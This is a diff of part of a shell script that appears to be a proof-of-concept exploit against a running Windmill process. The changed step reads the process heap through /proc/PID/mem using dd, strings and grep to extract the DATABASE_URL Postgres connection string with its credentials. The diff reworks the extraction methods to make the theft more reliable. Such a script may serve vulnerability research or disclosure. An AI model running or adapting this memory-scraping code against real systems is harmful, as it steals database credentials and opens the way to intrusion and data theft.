@@ -55,18 +55,14 @@ echo ""
 echo "[4/5] Attempting to extract DATABASE_URL from heap..."
 echo "  (This may take a few seconds...)"
 
-# Method 1: Direct grep (works without sudo if same UID)
-extracted=$(timeout 5 grep -aoP 'postgres://[^\x00\s]{1,200}' /proc/$windmill_pid/mem 2>/dev/null | head -1)
+# Method 1: Using dd + strings on heap region (MOST RELIABLE)
+# Direct grep/strings on /proc/mem doesn't work - need dd first
+skip_blocks=$((0x$heap_start / 4096))
+extracted=$(timeout 10 dd if=/proc/$windmill_pid/mem bs=4096 skip=$skip_blocks count=10000 2>/dev/null | strings | grep "postgres://postgres" | head -1)
 
 if [ -z "$extracted" ]; then
-    # Method 2: Using dd + strings on heap region
-    skip_blocks=$((0x$heap_start / 4096))
-    extracted=$(timeout 5 dd if=/proc/$windmill_pid/mem bs=4096 skip=$skip_blocks count=10000 2>/dev/null | strings | grep -E "^DATABASE_URL=postgres://" | head -1 | cut -d'=' -f2-)
-fi
-
-if [ -z "$extracted" ]; then
-    # Method 3: Search for environment-style format in memory
-    extracted=$(timeout 5 strings /proc/$windmill_pid/mem 2>/dev/null | grep -E "^DATABASE_URL=postgres://" | head -1 | cut -d'=' -f2-)
+    # Method 2: Search for environment variable format (DATABASE_URL=...)
+    extracted=$(timeout 10 dd if=/proc/$windmill_pid/mem bs=4096 skip=$skip_blocks count=10000 2>/dev/null | strings | grep "^DATABASE_URL=postgres://" | head -1 | cut -d'=' -f2-)
 fi
 
 echo ""
